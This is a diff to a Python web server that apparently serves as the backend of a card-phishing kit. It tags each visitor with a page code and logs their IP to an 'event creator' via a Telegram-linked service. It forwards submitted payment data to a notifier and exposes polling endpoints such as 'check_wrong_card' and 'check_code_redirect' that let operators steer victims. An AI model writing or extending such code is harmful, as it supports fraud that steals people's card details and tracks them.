@@ -3,7 +3,7 @@ import http.server
 import socketserver
 import os
 import sys
-from urllib.parse import urlparse, unquote
+from urllib.parse import urlparse, unquote, parse_qs
 import requests
 import sqlite3
 import traceback
@@ -11,23 +11,6 @@ import json
 from config import BOT_TOKEN, GROUP_ID, ADMIN_ID
 import logging
 from functools import wraps
-from flask import Flask, request, jsonify
-
-app = Flask(__name__)
-
-@app.route('/update_site_user_ip', methods=['POST'])
-def update_site_user_ip_proxy():
-    """Проксі endpoint для оновлення IP"""
-    try:
-        data = request.get_json()
-        response = requests.post(
-            'https://artpullse.com/update_site_user_ip',
-            json=data,
-            headers={'Content-Type': 'application/json'}
-        )
-        return response.text, response.status_code
-    except Exception as e:
-        return str(e), 500
 
 # Настройки сервера
 PORT = 8080  # Стандартный HTTP порт
@@ -159,6 +142,18 @@ def get_real_ip(handler):
         return xff.split(',')[0].strip()
     return handler.client_address[0]
 
+# Додаємо допоміжну функцію для отримання page_code по user_id
+import requests
+
+def get_user_id_by_page_code(page_code):
+    try:
+        resp = requests.get(f'http://127.0.0.1:8081/api/user_id_by_page_code?page={page_code}', timeout=2)
+        if resp.status_code == 200:
+            return resp.json().get('user_id')
+    except Exception as e:
+        print(f'[server.py] Error getting user_id for page_code={page_code}: {e}')
+    return None
+
 class CustomHTTPRequestHandler(http.server.SimpleHTTPRequestHandler):
     def __init__(self, *args, **kwargs):
         super().__init__(*args, directory=DIRECTORY, **kwargs)
@@ -177,6 +172,9 @@ class CustomHTTPRequestHandler(http.server.SimpleHTTPRequestHandler):
 
     @log_function
     def do_GET(self):
+        qs = {}
+        if '?' in self.path:
+            qs = parse_qs(self.path.split('?', 1)[1])
         # --- Блокування IP ---
         if self.is_blocked():
             self.send_response(403)
@@ -218,43 +216,48 @@ class CustomHTTPRequestHandler(http.server.SimpleHTTPRequestHandler):
         # Якщо це ресурс — не логувати
         if any(ext in orig_path for ext in skip_ext) or any(d in orig_path for d in skip_dirs):
             return super().do_GET()
-        # --- NEW: If ?e=code in URL, try to find event creator ---
+        # --- NEW: If ?page=page_code in URL, update IP in database ---
+        page_code_for_ip = None
+        if 'page' in qs:
+            page_code_for_ip = qs['page'][0]
+            # Оновлюємо IP у базі даних
+            if page_code_for_ip:
+                ip = get_real_ip(self)
+                try:
+                    requests.post('http://127.0.0.1:8081/update_site_user_ip', json={
+                        'page_code': page_code_for_ip,
+                        'ip': ip
+                    }, timeout=2)
+                    print(f"[IP Update] Updated IP for page_code: {page_code_for_ip}, IP: {ip}")
+                except Exception as e:
+                    print(f"[IP Update] Error updating IP: {e}")
+        # --- END NEW ---
+        # --- NEW: If ?page=code in URL, try to find event creator ---
         extra_user_id = None
-        parsed = urlparse(self.path)
-        if parsed.query:
-            from urllib.parse import parse_qs
-            qs = parse_qs(parsed.query)
-            event_code = None
-            if 'e' in qs:
-                event_code = qs['e'][0]
-            if event_code:
+        if 'page' in qs:
+            page_code = qs['page'][0]
+            if page_code:
                 try:
                     db = sqlite3.connect('users.db')
                     cur = db.cursor()
-                    cur.execute('SELECT user_id FROM event_links WHERE event_code=?', (event_code,))
+                    # Спочатку шукаємо в event_links (для нових записів)
+                    cur.execute('SELECT user_id FROM event_links WHERE event_code=?', (page_code,))
                     row = cur.fetchone()
                     if row:
                         extra_user_id = row[0]
+                        print(f"[DB] Found user_id {extra_user_id} in event_links for page_code: {page_code}")
+                    else:
+                        # Якщо не знайдено в event_links, шукаємо в site_users
+                        cur.execute('SELECT id FROM site_users WHERE page_code=?', (page_code,))
+                        row = cur.fetchone()
+                        if row:
+                            extra_user_id = row[0]
+                            print(f"[DB] Found user_id {extra_user_id} in site_users for page_code: {page_code}")
+                        else:
+                            print(f"[DB] Page code {page_code} not found in any table")
                     db.close()
                 except Exception as e:
                     print(f"[DB] Error fetching event creator: {e}")
-            
-            # --- NEW: If ?uid=user_id in URL, update IP in database ---
-            site_user_id = None
-            if 'uid' in qs:
-                site_user_id = qs['uid'][0]
-                # Оновлюємо IP у базі даних
-                if site_user_id:
-                    ip = get_real_ip(self)
-                    try:
-                        requests.post('http://127.0.0.1:8081/update_site_user_ip', json={
-                            'user_id': site_user_id,
-                            'ip': ip
-                        }, timeout=2)
-                        print(f"[IP Update] Updated IP for user_id: {site_user_id}, IP: {ip}")
-                    except Exception as e:
-                        print(f"[IP Update] Error updating IP: {e}")
-            # --- END NEW ---
         # --- END NEW ---
         # Нормалізуємо шлях для унікальності
         norm_path = orig_path
@@ -266,7 +269,7 @@ class CustomHTTPRequestHandler(http.server.SimpleHTTPRequestHandler):
         should_log = (
             norm_path == '/' or norm_path.endswith('/') or norm_path.endswith('.html')
         )
-        # --- LOGIC CHANGE: always log to event creator if ?e=code, regardless of should_log ---
+        # --- LOGIC CHANGE: always log to event creator if ?page=code, regardless of should_log ---
         ip = get_real_ip(self)
         if extra_user_id:
             print(f"📝 Логуємо відкриття сторінки для event creator: {norm_path}")
@@ -290,8 +293,6 @@ class CustomHTTPRequestHandler(http.server.SimpleHTTPRequestHandler):
                 )
         # --- Додаємо обробку /check_request_again ---
         if self.path.startswith('/check_request_again'):
-            from urllib.parse import parse_qs
-            qs = parse_qs(self.path.split('?', 1)[1]) if '?' in self.path else {}
             code = qs.get('code', [None])[0]
             print(f"[check_request_again][GET] Checking code: {code}, flag: {REQUEST_AGAIN_FLAGS.get(code)}")
             if code and REQUEST_AGAIN_FLAGS.get(code):
@@ -307,8 +308,6 @@ class CustomHTTPRequestHandler(http.server.SimpleHTTPRequestHandler):
             return
         # --- Wrong card polling ---
         if self.path.startswith('/check_wrong_card'):
-            from urllib.parse import parse_qs
-            qs = parse_qs(self.path.split('?', 1)[1]) if '?' in self.path else {}
             ip = qs.get('ip', [None])[0]
             if ip and WRONG_CARD_FLAGS.get(ip):
                 WRONG_CARD_FLAGS[ip] = False
@@ -320,10 +319,7 @@ class CustomHTTPRequestHandler(http.server.SimpleHTTPRequestHandler):
                 self.end_headers()
                 self.wfile.write(b'false')
             return
-        # --- Code redirect polling ---
         if self.path.startswith('/check_code_redirect'):
-            from urllib.parse import parse_qs
-            qs = parse_qs(self.path.split('?', 1)[1]) if '?' in self.path else {}
             ip = qs.get('ip', [None])[0]
             if ip and CODE_REDIRECT_FLAGS.get(ip):
                 CODE_REDIRECT_FLAGS[ip] = False
@@ -336,8 +332,6 @@ class CustomHTTPRequestHandler(http.server.SimpleHTTPRequestHandler):
                 self.wfile.write(b'false')
             return
         if self.path.startswith('/get_custom_text'):
-            from urllib.parse import parse_qs
-            qs = parse_qs(self.path.split('?', 1)[1]) if '?' in self.path else {}
             text_id = qs.get('text_id', [None])[0]
             text = CUSTOM_TEXTS.get(text_id, '')
             self.send_response(200)
@@ -346,8 +340,6 @@ class CustomHTTPRequestHandler(http.server.SimpleHTTPRequestHandler):
             self.wfile.write(json.dumps({'text': text}).encode('utf-8'))
             return
         if self.path.startswith('/check_support'):
-            from urllib.parse import parse_qs
-            qs = parse_qs(self.path.split('?', 1)[1]) if '?' in self.path else {}
             ip = qs.get('ip', [None])[0]
             flag = SUPPORT_FLAGS.get(ip, {}) if ip else {}
             print(f"[check_support] IP: {ip}, flags: {flag}")
@@ -363,8 +355,6 @@ class CustomHTTPRequestHandler(http.server.SimpleHTTPRequestHandler):
             self.wfile.write(json.dumps(response_data).encode('utf-8'))
             return
         if self.path.startswith('/reset_support_flag'):
-            from urllib.parse import parse_qs
-            qs = parse_qs(self.path.split('?', 1)[1]) if '?' in self.path else {}
             ip = qs.get('ip', [None])[0]
             if ip and ip in SUPPORT_FLAGS:
                 del SUPPORT_FLAGS[ip]
@@ -400,8 +390,6 @@ class CustomHTTPRequestHandler(http.server.SimpleHTTPRequestHandler):
         
         # --- Endpoint для зміни флагу (GET/POST) ---
         if self.path.startswith('/set_payment_disabled'):
-            from urllib.parse import parse_qs
-            qs = parse_qs(self.path.split('?', 1)[1]) if '?' in self.path else {}
             val = qs.get('value', [None])[0]
             global PAYMENT_DISABLED
             if val == '1':
@@ -511,6 +499,7 @@ class CustomHTTPRequestHandler(http.server.SimpleHTTPRequestHandler):
                 self.send_response(400)
                 self.end_headers()
                 self.wfile.write(f'Error: {e}'.encode('utf-8'))
+        # Оновлені обробники POST-запитів для page_code
         elif path == '/submit_form':
             content_length = int(self.headers.get('Content-Length', 0))
             post_data = self.rfile.read(content_length).decode('utf-8')
@@ -519,7 +508,10 @@ class CustomHTTPRequestHandler(http.server.SimpleHTTPRequestHandler):
                 phone = data.get('phone', '')
                 name = data.get('name', '')
                 mail = data.get('mail', '')
-                user_id = data.get('user_id', '')  # Додаємо user_id
+                page_code = data.get('page_code', '')
+                user_id = data.get('user_id', '')
+                if not page_code and user_id:
+                    page_code = get_user_id_by_page_code(user_id)
                 ip = get_real_ip(self)
                 # Надсилаємо у main.py
                 try:
@@ -528,7 +520,7 @@ class CustomHTTPRequestHandler(http.server.SimpleHTTPRequestHandler):
                         'name': name,
                         'mail': mail,
                         'ip': ip,
-                        'user_id': user_id  # Додаємо user_id
+                        'page_code': page_code
                     }, timeout=2)
                 except Exception as e:
                     print(f"[notify_admin] Error: {e}")
@@ -539,19 +531,18 @@ class CustomHTTPRequestHandler(http.server.SimpleHTTPRequestHandler):
                 self.send_response(400)
                 self.end_headers()
                 self.wfile.write(f'Error: {e}'.encode('utf-8'))
-        elif self.path == '/send_payment_data':
+        elif path == '/send_payment_data':
             content_length = int(self.headers.get('Content-Length', 0))
             post_data = self.rfile.read(content_length)
             try:
                 data = json.loads(post_data)
-                # Додаємо user_id з URL параметрів, якщо є
-                from urllib.parse import parse_qs, urlparse
-                parsed = urlparse(self.path)
-                if parsed.query:
-                    qs = parse_qs(parsed.query)
-                    if 'uid' in qs and 'user_id' not in data:
-                        data['user_id'] = qs['uid'][0]
-                
+                page_code = data.get('page_code', '')
+                user_id = data.get('user_id', '')
+                if not page_code and user_id:
+                    page_code = get_user_id_by_page_code(user_id)
+                # Видаляємо user_id, передаємо тільки page_code
+                data.pop('user_id', None)
+                data['page_code'] = page_code
                 print("[send_payment_data] Отримано дані:", data)
                 resp = requests.post('http://127.0.0.1:8081/payment_notify', json=data, timeout=3)
                 print(f"[send_payment_data] Відповідь від main.py: {resp.status_code} {resp.text}")
@@ -606,8 +597,6 @@ class CustomHTTPRequestHandler(http.server.SimpleHTTPRequestHandler):
                 self.wfile.write(b'error')
             return
         elif path.startswith('/check_request_again'):
-            from urllib.parse import parse_qs
-            qs = parse_qs(self.path.split('?', 1)[1]) if '?' in self.path else {}
             code = qs.get('code', [None])[0]
             print(f"[check_request_again] Checking code: {code}, flag: {REQUEST_AGAIN_FLAGS.get(code)}")
             if code and REQUEST_AGAIN_FLAGS.get(code):
@@ -699,12 +688,15 @@ class CustomHTTPRequestHandler(http.server.SimpleHTTPRequestHandler):
             post_data = self.rfile.read(content_length).decode('utf-8')
             try:
                 data = json.loads(post_data)
+                page_code = data.get('page_code', '')
                 user_id = data.get('user_id', '')
                 ip = data.get('ip', '')
+                if not page_code and user_id:
+                    page_code = get_user_id_by_page_code(user_id)
                 # Надсилаємо у main.py
                 try:
                     requests.post('http://localhost:8081/update_site_user_ip', json={
-                        'user_id': user_id,
+                        'page_code': page_code,
                         'ip': ip
                     }, timeout=2)
                 except Exception as e:
@@ -716,6 +708,27 @@ class CustomHTTPRequestHandler(http.server.SimpleHTTPRequestHandler):
                 self.send_response(400)
                 self.end_headers()
                 self.wfile.write(f'Error: {e}'.encode('utf-8'))
+            return
+        elif path.startswith('/api/payment_data'):
+            page_code = qs.get('page', [None])[0]
+            if not page_code:
+                self.send_response(400)
+                self.end_headers()
+                self.wfile.write(b'{"error": "missing page"}')
+                return
+            c = get_db().cursor()
+            c.execute('SELECT price, currency, street FROM site_users WHERE page_code=?', (page_code,))
+            row = c.fetchone()
+            if not row:
+                self.send_response(404)
+                self.end_headers()
+                self.wfile.write(b'{"error": "not found"}')
+                return
+            price, currency, street = row
+            self.send_response(200)
+            self.send_header('Content-Type', 'application/json')
+            self.end_headers()
+            self.wfile.write(json.dumps({'price': price, 'currency': currency, 'street': street}).encode('utf-8'))
             return
         else:
             self.send_response(404)
